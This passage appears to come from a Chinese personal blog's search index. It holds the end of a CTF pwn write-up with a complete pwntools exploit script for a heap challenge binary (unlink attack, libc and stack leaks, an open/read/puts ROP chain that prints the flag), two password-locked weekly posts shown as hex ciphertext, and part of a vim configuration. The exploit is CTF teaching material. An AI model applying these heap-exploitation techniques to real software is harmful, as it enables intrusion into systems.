&#x27;\\x7f\\x00\\x00&#x27;) - 0x3c4b20 - 88li(&#x27;libc_base &#x27; + hex(lib.address))\n\nunsoted bin attack 掌控管理指针的数组# 恢复刚才所使用的small bin 为fast binp = &#x27;A&#x27; * 0x60p += p64(0)p += p64(0x71)md(0, p)# unlink attack to listad(0x80, &#x27;A&#x27;) #idx 4# fake chunkplist = 0x6032f8 # 管理当前chunk的地址p = p64(0) # prev_sizep += p64(0x61) # sizep += p64(plist - 0x18) # fdp += p64(plist - 0x10) # bkp += p64(0x60) # next_sizep = p.ljust(0x60, &#x27;\\x00&#x27;) p += p64(0x60) # prev_sizep += &#x27;\\x90&#x27; # sizemd(3, p)rm(4) # 合并堆块,触发unlink\n\n获取stack地址# leak stack&#x27;&#x27;&#x27;in exe4023b3 : pop rdi ; ret4023b1 : pop rsi ; pop r15 ; ret400711 : retin libc0x33544 : pop rax ; retread1 RDI  0x02 RSI  0x7fffffffec18 —▸ 0x402327 3 RDX  0x78&#x27;&#x27;&#x27;pop_rdi = 0x4023b3pop_rsi_r15 = 0x4023b1ret = 0x400711pop_rax = lib.address + 0x33544pop_rdx = lib.address + 0x1b92md(3, p64(lib.sym[&#x27;_environ&#x27;])) # 将管理chunk 0的指针改为 libc中的_environ地址dp(0)environ = u64(ru(&#x27;\\x7f&#x27;)[-5:] + &#x27;\\x7f\\x00\\x00&#x27;) # 泄漏stack中的environ地址 li(&#x27;environ &#x27; + hex(environ))md_ret = environ - (0xee38 - 0xec18) # 计算 修改功能的ret地址li(&#x27;md_ret &#x27; + hex(md_ret))\n\n构造rop链通过open, read, puts函数实现flag的打印\nmd(3, p64(md_ret))puts_plt = exe.plt[&#x27;puts&#x27;]# creat ropflag = md_ret + 0x8 * 19p = p64(pop_rdi) + p64(flag)p += p64(pop_rsi_r15) + p64(0) + p64(0)p += p64(pop_rdx) + p64(0)p += p64(lib.sym[&#x27;open&#x27;]) # 8# readp += p64(pop_rdi) + p64(0x3)p += p64(pop_rsi_r15) + p64(flag) + p64(0)p += p64(pop_rdx) + p64(0x60)p += p64(lib.sym[&#x27;read&#x27;]) # 8p += p64(pop_rdi) + p64(flag)p += p64(lib.sym[&#x27;puts&#x27;])p += &#x27;./flag\\x00&#x27;sla(&#x27;&gt;&gt; &#x27;, str(4))sla(&#x27;?&#x27;, str(0))#db()sa(&#x27;?&#x27;, p)\n\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: I0ganfrom pwn import *#from LibcSearcher import LibcSearchercontext.log_level=&#x27;debug&#x27;#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]#context.terminal = &#x27;konsole&#x27;#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)exeFile = &#x27;lgd&#x27;libFile = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;#libFile = &#x27;./libc.so.6&#x27;remoteIp = &quot;0.0.0.0&quot;remotePort = 0LOCAL = 1LIB   = 1r   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(x)db    = lambda   : gdb.attach(io)#--------------------------Func-----------------------------def ad(size, data):\tsla(&#x27;&gt;&gt; &#x27;, str(1))\tsla(&#x27;_?&#x27;, str(size))\tsa(&#x27;no?&#x27;, data)def rm(idx):\tsla(&#x27;&gt;&gt; &#x27;, str(2))\tsla(&#x27;?&#x27;, str(idx))def dp(idx):\tsla(&#x27;&gt;&gt; &#x27;, str(3))\tsla(&#x27;?&#x27;, str(idx))def md(idx, data):\tsla(&#x27;&gt;&gt; &#x27;, str(4))\tsla(&#x27;?&#x27;, str(idx))\tsa(&#x27;?&#x27;, data)def q():\tsla(&#x27;&gt;&gt; &#x27;, str(5))\t#--------------------------Exploit--------------------------def exploit():\tsla(&#x27;name?&#x27;, &#x27;I0gan&#x27;)\tad(0x68, &#x27;A&#x27; * 0x100) # idx 0\tad(0x68, &#x27;A&#x27; * 0x78) # idx 1\tad(0x68, &#x27;A&#x27; * 0x78) # idx 2\tad(0x68, &#x27;A&#x27; * 0x78) # idx 3\tp = &#x27;A&#x27; * 0x60\tp += p64(0)\tp += p64(0xe1)\tmd(0, p)\trm(1)\tad(0x68, &#x27;A&#x27; * 0x78)\tdp(2)\tlib.address = u64(ru(&#x27;\\x7f&#x27;)[-5:] + &#x27;\\x7f\\x00\\x00&#x27;) - 0x3c4b20 - 88\tli(&#x27;libc_base &#x27; + hex(lib.address))\t# recover bin\tp = &#x27;A&#x27; * 0x60\tp += p64(0)\tp += p64(0x71)\tmd(0, p)\t# unlink attack to list\tad(0x80, &#x27;A&#x27;) #idx 4\t# fake chunk\tplist = 0x6032f8\tp = p64(0)\tp += p64(0x61)\tp += p64(plist - 0x18)\tp += p64(plist - 0x10)\tp += p64(0x60)\tp = p.ljust(0x60, &#x27;\\x00&#x27;)\tp += p64(0x60)\tp += &#x27;\\x90&#x27;\tmd(3, p)\trm(4)\t# leak stack\t&#x27;&#x27;&#x27;\tin exe\t4023b3 : pop rdi ; ret\t4023b1 : pop rsi ; pop r15 ; ret\t400711 : ret\tin libc\t0x33544 : pop rax ; ret\tread\t1 RDI  0x0\t2 RSI  0x7fffffffec18 —▸ 0x402327 \t3 RDX  0x78\t&#x27;&#x27;&#x27;\tpop_rdi = 0x4023b3\tpop_rsi_r15 = 0x4023b1\tret = 0x400711\tpop_rax = lib.address + 0x33544\tpop_rdx = lib.address + 0x1b92\tmd(3, p64(lib.sym[&#x27;_environ&#x27;]))\tdp(0)\tenviron = u64(ru(&#x27;\\x7f&#x27;)[-5:] + &#x27;\\x7f\\x00\\x00&#x27;)\tli(&#x27;environ &#x27; + hex(environ))\tmd_ret = environ - (0xee38 - 0xec18)\tli(&#x27;md_ret &#x27; + hex(md_ret))\tmd(3, p64(md_ret))\tputs_plt = exe.plt[&#x27;puts&#x27;]\t# creat rop\tflag = md_ret + 0x8 * 19\tp = p64(pop_rdi) + p64(flag)\tp += p64(pop_rsi_r15) + p64(0) + p64(0)\tp += p64(pop_rdx) + p64(0)\tp += p64(lib.sym[&#x27;open&#x27;]) # 8\t\t# read\tp += p64(pop_rdi) + p64(0x3)\tp += p64(pop_rsi_r15) + p64(flag) + p64(0)\tp += p64(pop_rdx) + p64(0x60)\tp += p64(lib.sym[&#x27;read&#x27;]) # 8\t\tp += p64(pop_rdi) + p64(flag)\tp += p64(lib.sym[&#x27;puts&#x27;])\tp += &#x27;./flag\\x00&#x27;\tsla(&#x27;&gt;&gt; &#x27;, str(4))\tsla(&#x27;?&#x27;, str(0))\t#db()\tsa(&#x27;?&#x27;, p)def finish():\tia()\tc()#--------------------------Main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\texe = ELF(exeFile)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\t\tio = exe.process(env = &#123;&quot;LD_PRELOAD&quot; : libFile&#125;)\t\telse:\t\t\tio = exe.process()\t\telse:\t\texe = ELF(exeFile)\t\tio = remote(remoteIp, remotePort)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\texploit()\tfinish()\n","categories":["ctf"],"tags":["pwn"]},{"title":"2020-03-28 周报","url":"/2020/03/28/life/weekly/2021-03-08-%E5%91%A8%E6%8A%A5/","content":"\n  69d01b89b9601e5c57b37cfc1411681a1f21976d1d4b0aa15d31e1e10e338977ef426035f35346e8a6c39e9c1233e5e20cca829a26921ef760ed3d4bb20f7ad341b0acdac59ba00b7a736eecea60366aafcf26284cef8f4f766a4313c5fdae1fca08ceaec128d6ebaa5a3171f556a1c11eb4aca97e257e48fa2e198a421097d767df5b8bc8d34a44d637e6d29ce7ba2cfefd9571f48e44d34b4a2312e0abdf95c4548a406b3a0f6df10f32fab262070fb1b29db575e88e730e6c0bf8090855062e55e12951f1e11f8264b9b2caa43d34ea4318e4fc47ee1c47acb733a86a883ecfc2462bc9997b764064603397b0f78bfa862387b475c41a9877c7b4517354699d30f748547c5d46ca938abaaa0b505c0c5c240bc70b2f706d09cc71e63ef3c06ffa63aa241a00f8d4ec30748043e86fb6037434ef51836f0839420506475cac8d10b2d1446b84fc305b6662979b15d7a4f9242ab5f54a040a53976269943574c6d7a6d4b5ae23ef27c2d9b3df39d69d1eb7e745c007af079697ed4b677ec465afafe93f07623131fbedcb6dda2ad03e2a5977d55f067badb19136f11d87b28b86c7d2ad6fbca13090e55926b141bb650b64b1aedf2b5d6a0b0c504c527057678fe88417501f92264e63f6d3afaf1d3e6bb5247732712cd2822373d734a29b11cd79c93005730dda70813f88e62bed895f36d5139293e14e66b237c475cc2a70e0260b26351ba4c8efdd78195f9f4c3e30587ca4593e20172b383c6815e6c933f958659b5eb67aa02ae815b8f41465efcad0b221cf8868c5d00ec1fb954d9878c4a2ddd49f765f8585200432ee68a3911834110c4948e5b6e1508153f63f41383b92c2d24a28cc1b55c06fba503b8c9066acd9fc82c599cbcb84196342193da9193b7de174fdff7d7bf3c574c6c338e62c976f297a4a3b65bf20f1b7a9a2d173e4ec472c09d9255fa215aaab908749e1fe5020400e73d3b12ea8c294e4dbea0a88d68887578a885d560c74be4628f71b5b71a30bc1063586aa2d949a9e791052aa27e321487c5950167a8acab1a73dfc65325d6cb560c3cb929f14a625cd0e128655949c147e8d275395ed97ba58886febbc8d17b219df0c2851b36c6a2c9900fbb4dc8d3452aaf004bc7524115b04eae464cacc0ea35acd4c28edd14e4a545a96ee0878e172dac979af126f247e1a645b8a3a5e4f2158fb777311b3a6b5300af6e2ce3a0e0d8a8cdb5fab443ede9a4c4efe912e994f42ea8b30144862752e163bb6bdf5ea1cff311c0f234f9f3efaae1d0accd1bc9054024142ad59e741bfd54b15b75e649f22dd3568df56980286fe083cec83a052e5d5e434af42761765bbe45262f1bc48a4760699b8383a220aa0a13d9a0a2ca67166bd0ab841df9a04c5bfb52df5f65ee56aa76f30978dec9864db16070a59cb26e19c82ae8c5c3031761a787757fadf2d9a8ea7f22e923398ce445a62871033ec9a1a0ef6bb7c4bc4f5e5ae51a61257c28dfdd204a412d63f553bd37b6b37dcc5878e63689be7dd0ec21ea403649705c1a6c2c057a2c55108a1adcf829dbea77d8814a9df1afc18d402db5a540549835ff9c187ddadc25274bf\n  \n    \n      \n      \n        请输入与 Rhodes Island™ 取得弱神经连接时的口令：\n      \n    \n  \n\n","categories":["life"],"tags":["life"]},{"title":"2020-03-28 周报","url":"/2020/03/28/life/weekly/2020-03-28-%E5%91%A8%E6%8A%A5/","content":"\n  69d01b89b9601e5c57b37cfc1411681a1f21976d1d4b0aa15d31e1e10e338977ef426035f35346e8a6c39e9c1233e5e20cca829a26921ef760ed3d4bb20f7ad341b0acdac59ba00b7a736eecea60366aafcf26284cef8f4f766a4313c5fdae1fca08ceaec128d6ebaa5a3171f556a1c11eb4aca97e257e48fa2e198a421097d767df5b8bc8d34a44d637e6d29ce7ba2cdb961952ff965abcf7980b0a3761724dc2c42749d1e01deed0f9349e292f93799628530bd0d8abae5575911e52481cd4de243833c53df1a2e0d3d9bf85786b44437782ad7936e99879da73d744d7150c2728ba341ff696fb30500344ba3a84f11e13604c5144bf0cad1ff424a0b5ab80a9b139f112ca25501e7df96001f96f758846585073571a24e864b60a5712fb4e259cf00e102c71bf1e5f52b3d984f0b07278fcabd8c3e7c7fd81d85e904ad21d27067626a0a19deb62a5ced83ac3843571d8dcf3aedb6cd2460f5d95736bc3c540c4bc86dada60fc44643fb312f0e2b8990bcbe5ad352871fd416a9469277a34059b7856dfc6246974e1b1ea53215366254e210083ee0059ba833310ffc0d602637468b0746d493f8a2df5eacc3d23e81c241524f9d19b2bbd1a3481e2e65e760e3d84b28120f7272e082577fe0aed1da3e323d9a206ba317bb8c4c7e21803a466258f9423fd0baf1d672a7c830f60f0e544f36db870715815175a063ee73d44a202fac7ded3a81be9d6ed8a93d5d5db53ceda54068f23f71d0df85a13f972ed728177078ee436026400b72173f150b445e5366c6a47ebf5774a8bf834dbf0576735a62a195f706826840c428ee7823403fa07e95478ea9bd8b6619f3b265281aac9b05a469f4657440bfca0238ea7e5ce1dd8d277e1174a0871ae3d52d8daa3fcad7fc398cf4ffeed5280d646b4698b8ab2d56be080a2b7e325db7de924626d2ec7e4b7cccfaa2002274dbd7f571046320616a4ee1ebb5109bf9beac2c28f5665a8795e01afff591190a9c42fda1a74a5e18c231eb08e5d7ffe9305a6390b3a3ade8e8d6b448c0f5e634cb936d7c15f5b100a9dbb14a4f1a39b1a91ff554c050955c0be4acbf36e87e9e95255a9ab634b68e08a130ae63292282cefa629b0f4290f817d7f877f74e2d32cb4a797595a23b4509d20f75dbe0f1e4a40e3c61a46b92318e7caa629a32afdcf23e5597421b575bd37c51b0703c0cd2bc781e6cffd6460150e220bfeb765bccfd9e71b5735e12299b1950e871d33720b8f60a8af793f33bc3130948889b9bf9f79a0de9b58c247c70406d07290627ff29f4cc5f94cfa1c7e020b7e77418abd2bc537dd550134acf45451d259249e988cb102b649fe0772da17f9c6a9c745d8edb84265b3a53484953387d660eaa2a73814c367e37bd9eb416d684cb13ec545d455e03c069747893682e632a172d5718ded461e7bcef9bbb54e5df5be242939bf3e4dd0fb5967c4c933e5a2c23f493445980f40640b0f2da619857083f7feb8f38b1e8347dbc3f6f4be31f97ea47b0116bd1fc96b94e2800bc7fb2911e963bc1ac8a70980ab33523641461ccf2211e36375b6efc6ef9e2f0c053b2913cc4c87fdf422bf2c3d9e6fd4a147752ce6a6378ab4dc0095b1f47deccd1cdfb224cae2dd213af24d541c5436594fc43dc43ac13cb60d6ceaeba54774b0c1772e1fdcf4fd1d30faafcc2a18630a15ed2cc4db54f7c9a1b4020b8620301a0c73c83183fcbca93163fed79484345f9c6f09349210cc8d4b95e9f5e59549a4c6fabca17b96767985e1896d84e27077abdad4d94ae32d787800df5d3d2e044c8c2c5bc8db733e55ea9ad60f8d559ad7749ac0cf1770e9b1f83fcb2686b88ad14d6d0baabc61e8f9b8df63ef67f91ad2d2a8f893ae852adfbb2d13314ce993ec2c8807afe30542cf873fbde7b9fd6e0e1378bf89497946506a92537dc4c0e71a50d4fcab7eb106427c63ce7216cb9ca2f9f18ab100d63db5dbdd945e53a7ee0524313eb42105b6d4024cdd051696e658598da38805949284be9f532e62a19038f25559cd1972772f1b796aecf859601d3e71356d96fc1c34556752aef1e988313da4e1cffa867189905b1067e5b7238238e062ed1c87f0909b34c7f30a683cd694de56d82b975aebc871c69d8b2ad1122585448cb90f875a86959177a4dbcf1307fb50264a44eb744589944a830ee6e04dc094bfc6df8f2b97b88fe8ed52011920901895ac5d78409303ca685b97591e564088d5b3ad95b98f066b097a81a965f44ec0f2140af8986cc35bcfb541c0d5e8920050d677a5997dedbf6642086713ac7739977744dc43a9c80d9e59de5831bb671f471075dfbda93b298f790ffc9e1de78b824a0d235b30b16f3927d3591ca802905f0e039c77c362d698ffd630cd7a34e6d2906ae2b0e7ea07b3383c7e4c4ed861d000e8182055721db163140bbd410cfb9b41c0e61c7ae496c170b599dd4cc25ffdf782797110884fd9a09dac1c06257177a9d68ae20f78427f111d74a628ca465595481ccdc07833f9eec9d2545369c25ea9c59f1918b9e48042dcd4f2db58d6a28759c40a1387972bb2949632396afff88a4481625628b5eab6ae56d7c10475104f5a8986ff41b8cbd95fbff2bb1157086d790f23866f8a097e4f10740573b1417230b66f11cce4ca7863d99088216c492f7de615afb0482f25e58f7a1499fbe611121f3f82b7ddc8d7d9a030b1e6d97c211fbe62e737729d0081af4eb2bcd81e6bbe359aa7e7d1a3a713559368ee25131d87ddbccdce665ef0fc9bb8ebf897c08064792a173d814eba681c3f509a4e611a2dcd1cb9169bed2f5b3bdc6db7398b89d44d6347cbfcd34fad7d67ff53bace52838c580829c8b0ab7c92f1c3b46f781d0615b05860689daa2cd3b0fbe349c0cdc47145e9206a9e127d339ccd45ef4b41da00910a650e3a0bd6de6914ede9aa08da5a77b721fe600b5e0bf07eebcbf22ced18d798bff99a5f746e30497e96c4504c542dc35de54335e838469f3aedab2beea035ff7e4e01f4097a1c387d55f5399632f8b0ad73baf3a3b06b57124dd9c659f99e9ff4f7f5a1270c4cb1d477755989b0b2b988de859dfc1ad651d823f022271f37c2f5a4f0cd9616a7cf8620d290c674cfba9c204e67bb4aaf6ac814a8c670e90269ac65128ba2a6a5ff7cbda4487a4e415603026b518f529117884ac624b10d54678d9073ed5f831345e83ad06791a2ed17fce6d62fcd975b0a31bb3fd9066c3fe51490de78e418518006df0e1849222b7b82ab8d8902ecb9c56aed3c106ca59fdc10cf5f32a48b9018aa39e6e911ffc6bbe7cacfec6d8e11e5d514c42164157a389e3750997004622349be10bea097784e54ebc71623c85a164f1f5ab641a7465d5ce9f8fb8dd94e03ddd3ee3cd1e8b2b97f519602a95a0bf1307595d3482cf2b05d30bf70994a04a7dced974ced9030a7cf69c7b7a383f77bc7df7a02587a766402508936132bdea0441fabb9400d71557a39bf8bef782678991fdc5fbbd6dfc6438663cedbf5a9ff0c3098b767b92492031f3517a0a50ac85eddcaa59ebba73972907720c6f40232f20670b9605758bb0d9035b75b65b154bf63f2bd78bbe4305a1eb2409b1ea467c093bb797af130736922751ca795f10f9ddc36f1be2bc022c9683995f8b97e2c63de95435288510d9d36deaf7dd2fa4cefaf63d11b180e03f6187c87686f6131f371cd75d6be8c44d5e23850f3f319e39a746ed3b70a7eb68f3c1b7ce7a584276d250197f5f88883bcebac769a5fcdc23f480146276a436e8639b9a9e4a2ae8de57be8ccb516b467074acfd7d7209e2d64c89e0423b81d7eaf3d2aa0d30494a8cd4fee6bf90fd38e7244db5b6fdd7ace9eca4b7e5dcdb68a989e876b1f1f185cc580d9eb9355031cbb2dc6fe40808fba94c17a0e649a1a8cce0e7f2434dcf84fb42a74b28ae9ced5f29898602e2628d921609039f12144313ba60ad0bb6683dc5ac28414d1cf6b429224803410741aba9af628783b180fafd5e0c246d3e328020e9246bfde0cdb922f98b13a1e26b4e2a0ef779d70055bfd87efb57d331070fb92ae75ed3b0d00736b6b14d91b8bec92155963b2d4acd06177288cff2349d8c6688b6241763590f5cbb9ff5e18e13025bf4bbdfe32d8946eb84779edf2d275ca8f4aeb16ec537fe836e1f3ba867e759a0a4756959b962326fb227e79c36bdd64b3af2d2454339e1fcdd2341965713bcf397ad749caa3be82a85ea9fd765bd5704ac332298765122a27defe3030c01984ec4cff03178c04da893a9a66812f450c2481c417af74e2221ae090718e98a5064646fea9dc4110bb2ae17b697e665daaee0ffd292aa733bde5e8800c37358ae9b36a6d376c7c064317ddb7606217f5ff052401d772ae6c507040c091507dda27eb3e432c25ac976f876b08683049bdada2a4aa063eb18762d0df9bcde652db9afca120cd250e58ccd1f5d569ce71fc43b85a360fafa3afbbd645359372c8e06cf9a908d40e727764c6ce25d9cdbee9b5530c3bc62e7722f8ab2b87075f93f85d7d23312754051d5373626aac8e6e2a933ee20296dc21edb4586f9138432a875b609f295ef1b704852c6567318672803fe8d1c2cc434c5b1f25fce2e320dbca9a06a4148804e3fcbadd639fc9fabbf0ee393d539962f057dacc12b6d73e86aadba0f25f8c39006b8ae4cc84f86dc8ff5b24560cee710583cf7c0d108d80288601794c74e145101829fd827f57ed7dfd2d5b189fd39ae032f113d30743f3eb698d4c785dfe0a4b7361a635200867189731b64c7df427bd27a19163f19bb6b37c43ce8b58ba4c16ca1e5c646f72c2ed062eae17f9609bbff6df4ef0cfbab27422f839f4413ee205bae6bd918903f09f934f242a8cf9f2ce33e4f071601fb5186e92be8c9c99c1998b9e39bb9e9e961cfe754efe90db56cbfb376ee7b63b375653f8a57e2cfccb3629e1aff0138c90188edb152bc3e2170d248591c89c06c4df50b07b099f8c5b995af57bf7eae40e91371e4de1d65a2d14e8680d9ff66d8a6db54f3ed61f91a968d9c9932a31ae7b121635fa0b7bb787c826ceb2018bbfea278073bd0fb3cb6eaf6c90cdddd89e6f86a2b3382828c64ca57071fad00db9383a3bf0a1a5544331118ee30932e2983cda2c5dc78a8025bfa5792ba50825bd2a7bdfe23a3db87326e666616268e3a2e19469ca47aaa1ba0a16cb0004633d8a838f2f46d6793cfe0ea9088cdba1eb57630a2f32146a01099dcb68278d7e0fd1b2e8ba76236e6306d5ae7907922761d3bb053bb5197e2832b4ef811ff3611dfef99a44705f2feac4f3a63ab4806f700f9a121acf3e5b422e3ee5c3b0936319ed5caed41670ea2d6af8c1cc8e0ee31a64f4f7c595f910649b8b287411f3aa24dc94c5e3c6552e0b48226cf76d91e1d613e47bc9d6be49b7589c5065b3dab886b9db976ecfe720d7e2978a3954556f9ab053688b873909547a529def9ae00fe7a26405a1641b7939ea4bd2897562e27d061a3d44240075238c162ad33c018b3a1a7534ee04965d22527b5a5428232f5ae3f1118f22c5aea4243b81562022c00944190084519114a076a63e6d56498ae518f575e1fed1588786db0651f643628effa0d02a9f9be875491c2861f1000880b698c7b1ec5f329144ad2f6c31f60b02d1e7b1e326e00a2aec1b3c0419c24f9c4ea0e64a4d5f8a3a3285ca51b585aa6c5db7cbf9f8481206954ef8f1814804836ea9328276a00d4ca62c1815982cd91d1cbcd3e3898e3d8a5e5bb837d4d638d71031133a7d2e4e623e832def6a5c3cbfe1b4dde7f2375efba02318569ef354548e034f9d85f3268a254d289d9eb145310298dc6c5bf864c597de92f396e95a42d42b73cf6b3fc878468c79deaff47d35505217ba04661a6cda312a11fe29700d941e4db222b53781810d888dd319ade40257306c4d001a0743a079e0c64f45c0a9eb657ab578501ea87f7a5622e460d70292040b9f4933793b0580a9778c41768d952726ff78c3ec5a0d60ac09950a795bd889842b43b8453a913663dac475f64d9bb8afdc9c387245d511088cbe79a4e0dd98038263ba041284655e5d491f3389aed739e87706f7670be598b6dc81b1f7aed190628ca64852d950314b670aebe2c9f2cdee0313e07cc02d549e8f39f4538260bdc89267b586af4def9b6d137737bc82c5fed7862ea1acccfde51da23726cac53f0daf92f835c3701cf0d2d60cd9eda064114cb21770abf7b4743582e41b727e6dad240a7f620e0faea098a9e9b1441580f42c96b8c52b7cd0811a562338e592b7b95f8aebe78df6e50597b1467a2ceb5ca1dd198c6e18328b44dbdf2eedd57b1a4519578579da4a1df2c68c08d051b9c5e450f4330b015fe47f1462f778c99155fded7e7e86e2b05b3d3478e1973ad8e48abffa54329b5efea3e58c4c7540ab5cefa1edb82ded4e282146ade5d91b32206a09db90e10fb867703893c7fb96e1eae7dc0dbe639bf4b64336f3b018b88e57fc0afd49726817aac2718d1e218a6aa23b2b96517095882da7aba0e878903f249c6eb2a3fce0282690d16214e8895f2faba5fd92b1c30acb26327ad00e697388dad6a1c2b79efc3c73dfd019a95111806abb6c2674ec6fc0132c96cf89bf69bb05e716b6a0ba551b96ae0f9b867598608c73f99b49f5974c1984290c32c96f9461dec166245abc9b9b7de5cc194067f22c164e8dbcab1cb024e0109dd19f82bbb23e8c1bb3d5228327f69faff792c375bce4f8465a576513294234ada9c39c3496ad6323f9c5671684fd306a6e229da41096732bfbb0e92f67ad75cdd12e579faa566ca5c6c3c947d203d216465e340c89a575145a199a83e9436f688fdae06b9b17de3c425e433621e5ddd6506794df2bc1bbfd068a35f1603fb380ff8e4df2aed34dbe2acd1ad00741272c860d30f57c4cca0209b9b285795ac134a16561066a8faf547b4feb12d150b8d213d4ae9a55fa5714980297f4fc6b11da242bbb67a0ef80984c1b05dc0b46c939c8c60483d3b0a002230c86c829902b0f4e262a02c7175ac5faab7e4b443625d7f76390f4840d3b5bbfc2506ffe5ed9e25316f14f614041555129dd808d1ae480e189781534610eb04d57890b50222936224862f5ecb7947ce3dc20d8b42859e0466065d142698e46263b04a2af479565aff6567fadcc3a224b58b9cfe741e8e41b00f6d383ab81919dbe99bae6bced27afec2a4e3fe8da20bf162f228775735bef2b7163924545faa3f9f01d85a35e7b2da78cab089a70cfa734120dc264715a57d771a242e35b0a1a3fbe618b3c20a7a6735f85766eb26eb74133c3578e8c57a6889f41655e6b3aa0c5582743259ada14b37df30253adf78b30005f89a7c1caa3537bee8496d7784121b4a548a4bdacfdebfbf2cc555f5428ff956b5ce55f8ae742f843e1370ab7d11ed368266df15ef0cb3d827a1dd39783a9439a3f87cf59a5d96587aa2094d506cad1683cfba8ea2f8da1956a281a0a40c9ae402682d05e3a8e52b2cd58b87241b4afe0529e8b3faaf6a01d2cc1df3e1aaf88f778b552ba7d91c81263061c268622383aff151e7e2023616c59251d087568d85c3a53a167a94c2759b1558dbbe356ad48e75a16a4a3fa65a125d7a132f524958881c68fde3271dbccfa4f9131c5ba1e70a6ddd81a1b3bb8c09f0bcf198903b389dbf5d0479cb1f0e2216fd3a3711566c5c4d6ab01db7d5263f927bcafe82b9bc02f181ddb7cc42c6c2599a1cf6103ac8ebcfd1ad42cb7c0406fa94f32ca8ae3ef83e96aa455a1aa3b5060afb2dc219a84a9d50c2e1a86afe2ab8d3d2ea2f5fe198b77cd3693ea868a015fb49d4d6898c4baafdee224540d8627ef56e281d3196016f26d3c625e3152f45fad86787de88bfa0384b95f90858a9efc07229d48c058419fe2350531af04f085f060de2e73ba14bc6b010e005232b458ce699f6381683e1459840524ee0de24f8b003042ff84280844e0dd7574585768d47105b8e5100bff5d70c5337b60a9cd54d998be6a0a98abbb3f6512b268930c943049c13922b7611559e6f1315f58cb1092ec06c6c028357471e76bb538558c9a7ffa96d7eaa5c810382863512e4eabe6102417b7fe26e2454116eae09d6322bd177940bf781063bfc8344a3272c0cdb8f2f3e991ded6fe338a30147cfab25eb13074b5af6d96a1fd2d77c5d27326b98428f9c18654bc4bad6ab82cd3dc38879bf8059d1b7e2dc908cdb8b8bbb781f20c2586f533e16c51956c1bcdfe8e4af37e5d243de3651227800baed2f9c99f715b0ac10c86811edb91b7b7826ff6ad2d19e995bee32cb27305e05b9271929cac8ca5caf6b38895b9e2df5b74850c55c034a9178bc823f87ae6e0693ac0f79cf1cd88ffc1ac5407b7d3d29e036e1ac440f4351d3dd025da8cb195397f2e562da4951f868c6a5d9fc265b6db51cf584cd58443a2e4ffb4d3419548d9ee102bf6e92ed8730fa019456727360c4c4c2b4c1dff260a46d0b32e19f05ac25a5418120ad6b9434a4f0c57be37f621f0546e2fed2c7d52bb8db8d99a90197911f021a7877a7d2a69371c86f6594326df94b9e4bf8134ac66896fd93f817ebca6b9d24a7a6b89d46a96243ae5531eae09974ebcc6b61077b0ff29abaf0b83a9d9186c568335f8f66cdd1a63bc394d4fc2e1282a89a7169124a4d2fe801625ba2fc1afb9e075ad7dacbb108a64ffa9926fb2e116fbe952a0b37f7765fcb0a3084ba81bafd78dcc684ff49aee3721752fa0ed82f91cbc159daa2814bd5d15c7e375fe69665a90ad5504ebaabb1171801ce0eba1ccb20179a006e501d175d7cf9a31052e6c727a0c75641f1883bf931eeca91c244aab05b58cc14d8cb7cb9fa283db5b1eb98faa0b522df3afe801f8e3f69c8f0c93cc0b1625f27ed0acb4593d888f5ef253a4d93a407eb2d4babec2db085ddbae5d3d8eb62656314a7b47c1718d7c7da7c0fc777f5c1b75af2460d8d9b12a4db9f39ca032b718e8722f67c229ccd656aa34fc581c464c09945c8ac06e96caf74f936eb309f6d3b75530d5ce62f3114bb0febf42fb6dfe816031fc99e194be2da37494ca5dcacfe2549cdc45ee2d732206f9b95481fc1397b1159cf20ff781bdd889132d8f43d3bcb6e0c8dd6be5d9ab8a83fe5e7f32fc1c10868b1aee2610db8fd60c928e5b87bbb80e574b1dd2a4a53bbbb0469080ee0dc094aff8827d3ae7837361b85e25ff77477bc7353adc34bb0f8b309f7fb274ff508a85bad18feb5c34466eb754a22291e0779e6509f7b45f1d3bbaa2b21e033d0b2742ad6371266406372cc458e2ffe25b20d5cd5f96bf2b82461767ee26c85a305c93b06f43b19043b1587bcb27f841b9c504a3a150f19c01dc71b88fbb8712c1e3bd2e15be68287207a95ddda1d3870ce46e60e0b782968a62b97b58b0418fdfba42db5ff4cbd669f4823ad8d56d80526b2e4308ebe2eef94eb0393daeb4233acdfd27408e23ba6f7dd66f8c3c34be2b3047d64947dee3447ffbd103af23429da05aebc1ca3d2568b959d531887f902aa6edb651f905f07b689ab00ddf357c0496b496404090e72cba8dcdfbab0f1ea6a904c21b0fa076b8d6941a1f6798542e52cc577d7f9f58e7c14e4e751a6dcc4cd4358cdc39bb0199c4b4cabc3d221cd1d521bb8af68712242b45dc6ef0c55849f327f81190175b606b308e49c321c6ad66a98909\n  \n    \n      \n      \n        请输入与 Rhodes Island™ 取得弱神经连接时的口令：\n      \n    \n  \n\n","categories":["life"],"tags":["life"]},{"title":"vim配置","url":"/2020/03/25/env/linux/vim_config/","content":"vim config详细参考：https://happi0.gitee.io/happi0/2021/01/05/vim/\n下面是我的基本配置。\n&quot;Author: I0gancolorscheme koehler &quot;主题set cursorline &quot;设置横线syntax on &quot;语法高亮set autowrite &quot;自动保存set ruler     &quot;设置尺子set noeb      &quot;去掉输入错误提示音set tabstop=4 &quot;设置缩进为4&quot;自动缩进set autoindent&quot;set cindent&quot;统一缩进为4set ts=4set softtabstop=4set shiftwidth=4set number &quot;显示行号&quot;set ignorecase &quot;搜索时忽略大小写&quot;搜索时逐字高亮set hlsearch  set incsearch set enc=utf-8 &quot;设置编码&quot;设置鼠标可以在任何地方都使用set mouse=a set selection=exclusiveset selectmode=mouse,keyset completeopt=preview,menu &quot;代码补全set clipboard=unnamed        &quot;共享剪贴板  set autoread                 &quot;设置当文件被改动时自动载入set confirm                  